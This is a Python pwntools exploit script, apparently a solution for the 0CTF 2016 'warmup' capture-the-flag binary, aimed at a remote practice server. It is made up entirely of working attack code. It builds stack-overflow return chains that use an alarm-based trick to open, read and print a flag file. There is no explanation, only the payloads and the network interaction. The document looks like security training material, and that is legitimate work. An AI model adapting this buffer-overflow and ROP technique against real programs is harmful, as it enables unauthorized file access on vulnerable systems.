from pwn import *

elf = ELF("./warmup")

vuln_func = 0x804815a
read_func = 0x804811d
write_func = 0x8048135
exit_func = 0x804814d
alarm_func = 0x804810d
syscall_arg3 = 0x8048122
buf_addr = 0x8049400

flag_file_str = "/flag\x00"

#sock = process(elf.path)
gs = """
    break *0x80481bb
    continue
"""
#sock = gdb.debug(elf.path, gdbscript = gs)
sock = remote("node4.buuoj.cn",29929)

payload = b"A" * 0x20
payload += p32(read_func)
payload += p32(vuln_func)
payload += p32(constants.STDIN_FILENO)
payload += p32(buf_addr)
payload += p32(len(flag_file_str))

sock.sendafter(b"Welcome to 0CTF 2016!", payload)
sock.sendafter(b"Good Luck!\n", flag_file_str.encode())

payload = b"A" * 0x20
payload += p32(alarm_func)
payload += p32(vuln_func)
payload += p32(constants.SYS_open)

sock.send(payload)

payload = b"A" * 0x20
payload += p32(alarm_func)
payload += p32(syscall_arg3)
payload += p32(vuln_func)
payload += p32(buf_addr)
payload += p32(constants.O_RDONLY)
sock.sendafter(b"Good Luck!\n", payload)

payload = b"A" * 0x20
payload += p32(read_func)
payload += p32(vuln_func)
payload += p32(3)
payload += p32(buf_addr)
payload += p32(0x100)
sock.sendafter(b"Good Luck!\n", payload)

payload = b"A" * 0x20
payload += p32(write_func)
payload += p32(exit_func)
payload += p32(constants.STDOUT_FILENO)
payload += p32(buf_addr)
payload += p32(0x100)
sock.sendafter(b"Good Luck!\n", payload)


sock.interactive()
